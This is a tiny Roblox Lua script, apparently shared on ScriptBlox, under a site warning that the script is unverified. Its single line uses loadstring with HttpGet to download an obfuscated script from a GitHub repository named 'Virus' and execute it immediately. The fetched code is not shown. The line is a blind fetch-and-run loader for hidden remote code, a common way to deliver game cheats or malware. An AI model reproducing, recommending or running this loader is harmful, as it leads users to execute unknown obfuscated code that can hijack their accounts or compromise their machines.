--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/Drag0n75/Virus/main/obfuscated_script-1773166287038.lua"))()